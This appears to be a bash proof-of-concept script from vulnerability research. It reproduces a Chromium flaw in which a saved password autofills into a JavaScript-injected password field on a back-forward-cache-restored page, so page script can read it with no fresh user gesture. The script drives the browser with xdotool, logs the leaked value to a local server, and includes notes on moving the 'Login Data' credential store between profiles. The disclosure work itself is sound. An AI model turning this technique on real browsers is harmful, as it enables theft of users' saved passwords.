#!/bin/bash
# Full end-to-end reproduction: a REAL saved password reveals into a
# dynamically-injected password field's JS-readable .value, with ZERO fresh
# gesture on a genuinely BFCache-restored page.
#
# This script runs the ATTACK PHASE only. It requires a Chromium profile
# directory that already has one saved credential for
# http://127.0.0.1:${PORT}/ in its "Login Data" SQLite store (encrypted
# password blob, via OSCrypt/libsecret -- normal Chromium password storage).
#
# --- Provisioning a credential (do this once, out of band) ---
# The most reliable way found in this research: open
# chrome://password-manager/passwords in ANY Chromium instance running as
# the same OS user (CDP/automation-driven is fine for this step ONLY -- it
# does not need bfcache), click "Add", fill Website=http://127.0.0.1:8901,
# Username=pocuser, Password=<your test password>, click "Save". Then copy
# that profile's "Login Data" file into the profile you point this script
# at via CHROME_PROFILE below (Login Data is a normal SQLite DB; encrypted
# password blobs decrypt fine in any profile under the same OS user, since
# the OSCrypt key on Linux is held by the system keyring/libsecret, not the
# profile directory). Verify the row landed with:
#   sqlite3 "<profile>/Default/Login Data" \
#     "SELECT origin_url, username_value, length(password_value) FROM logins;"
#
# IMPORTANT: whatever browser instance you use for provisioning must be
# CLOSED before this script's Chromium (or any other process) opens the same
# "Login Data" file -- SQLite will lock it.
set -euo pipefail
cd "$(dirname "$0")"

CHROMIUM_BIN="${CHROMIUM_BIN:-/usr/bin/chromium}"
CHROME_PROFILE="${CHROME_PROFILE:?Set CHROME_PROFILE to a profile dir with a saved http://127.0.0.1:8901/ credential}"
PORT=8901
LOG="$(pwd)/server.log"
rm -f "$LOG"

echo "[*] Confirming the profile has a saved credential for our test origin..."
sqlite3 "$CHROME_PROFILE/Default/Login Data" \
  "SELECT origin_url, username_value FROM logins WHERE origin_url LIKE '%127.0.0.1:${PORT}%';" || {
  echo "[-] No matching saved credential found in $CHROME_PROFILE. See provisioning notes above."; exit 1;
}

echo "[*] Starting local static+report server on 127.0.0.1:${PORT}"
python3 server.py &
SERVER_PID=$!
sleep 1

cleanup() { kill -9 "$SERVER_PID" 2>/dev/null || true; kill -9 "$CHROME_PID" 2>/dev/null || true; }
trap cleanup EXIT

echo "[*] Launching Chromium (NO CDP/remote-debugging -- required for BFCache) on the credential-bearing profile"
DISPLAY="${DISPLAY:-:0.0}" "$CHROMIUM_BIN" \
  --user-data-dir="$CHROME_PROFILE" \
  --no-first-run --no-default-browser-check \
  --window-size=1000,800 --window-position=0,0 \
  "http://127.0.0.1:${PORT}/attack.html" &
CHROME_PID=$!
sleep 3

echo "[*] Sending a REAL trusted keyboard-activated click on the benign button (unrelated to any login form)"
DISPLAY="${DISPLAY:-:0.0}" xdotool key Return
sleep 1

echo "[*] Navigating to the neutral page (Tab to link, Enter to follow)"
DISPLAY="${DISPLAY:-:0.0}" xdotool key Tab
sleep 0.3
DISPLAY="${DISPLAY:-:0.0}" xdotool key Return
sleep 1.5

echo "[*] Navigating back (Alt+Left) -- restores attack.html from BFCache; the page's own"
echo "    pageshow handler then injects a fresh <input type=password> via a timer, with"
echo "    ZERO gesture on the restored page, and polls its real .value"
DISPLAY="${DISPLAY:-:0.0}" xdotool key alt+Left
sleep 4

echo ""
echo "=== server.log ==="
cat "$LOG"
echo ""

if grep -q 'event=poll-injected-value&value=[^&]' "$LOG" && ! grep -q 'event=poll-injected-value&value=&' "$LOG"; then
  echo "[+] CONFIRMED: the real saved password appeared in the dynamically-injected"
  echo "    field's JS-readable .value, with zero fresh gesture on the BFCache-restored page."
else
  echo "[-] Did not observe a non-empty poll-injected-value line. See server.log above."
fi
